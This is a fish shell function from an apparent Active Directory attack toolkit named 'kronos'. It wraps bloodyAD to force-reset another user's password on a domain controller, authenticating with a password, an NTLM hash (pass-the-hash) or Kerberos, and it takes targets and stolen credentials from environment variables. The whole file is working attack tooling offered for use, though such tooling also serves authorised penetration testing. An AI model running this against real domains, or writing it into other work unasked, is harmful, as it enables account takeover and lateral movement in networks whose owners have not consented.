# description: Force change a user's password using bloodyAD
function __kronos_forcechange --description "Force change a user's password using bloodyAD"
    argparse h/help u/username= p/password= H/hash= t/target-user= P/new-password= k/kerberos -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos forcechange [TARGET] [OPTIONS]"
        echo ""
        echo "Force change a user's password using bloodyAD."
        echo ""
        echo "Arguments:"
        echo "  TARGET              IP, hostname, or nameserver (falls back to \$TGT_DC_IP or \$TGT_DC)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username for authentication (falls back to \$TGT_CRED_USERNAME)"
        echo "  -p, --password PASS Provide password for authentication (falls back to \$TGT_CRED_PASSWORD)"
        echo "  -H, --hash HASH     Provide NTLM hash for authentication"
        echo "  -t, --target-user U Target user whose password will be changed"
        echo "  -P, --new-password  The new password to set"
        echo "  -k, --kerberos      Use Kerberos authentication (requires KRB5CCNAME)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"; set target $TGT; end
    
    if test -z "$target"
        echo "error: target is required" >&2
        return 1
    end

    if not set -q _flag_target_user
        echo "error: target user (-t) is required" >&2
        return 1
    end

    if not set -q _flag_new_password
        echo "error: new password (-P) is required" >&2
        return 1
    end

    set -l user $_flag_username
    if test -z "$user"; set user $TGT_CRED_USERNAME; end

    set -l pass $_flag_password
    if test -z "$pass"; set pass $TGT_CRED_PASSWORD; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN is not set" >&2
        return 1
    end

    if not command -v bloodyAD >/dev/null
        echo "error: bloodyAD not found. run 'kronos install'." >&2
        return 1
    end

    set -l cmd_str bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_str -k
    else
        if test -z "$user"
            echo "error: credentials required" >&2
            return 1
        end
        set -a cmd_str -u "$user"
        if set -q _flag_hash
            set -a cmd_str -p ":$_flag_hash"
        else
            set -a cmd_str -p "$pass"
        end
    end

    set -a cmd_str set password "$_flag_target_user" "$_flag_new_password"

    echo "[*] Force-changing password for $_flag_target_user via bloodyAD..."
    command $cmd_str
end
